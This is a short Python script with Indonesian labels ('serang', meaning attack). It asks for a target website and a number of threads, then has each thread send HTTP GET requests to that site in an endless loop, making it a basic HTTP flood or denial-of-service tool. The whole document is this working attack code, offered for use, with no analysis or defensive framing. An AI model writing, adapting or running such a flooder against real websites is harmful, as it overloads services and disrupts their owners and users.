import requests, threading

url = input("Target Website (https://example.com): ")
thread_count = int(input("Jumlah Threads: "))

def serang():
    while True:
        try:
            res = requests.get(url)
            print(f"[+] Serang {url} | Status: {res.status_code}")
        except:
            print("[-] Gagal!")

for i in range(thread_count):
    t = threading.Thread(target=serang)
    t.start()
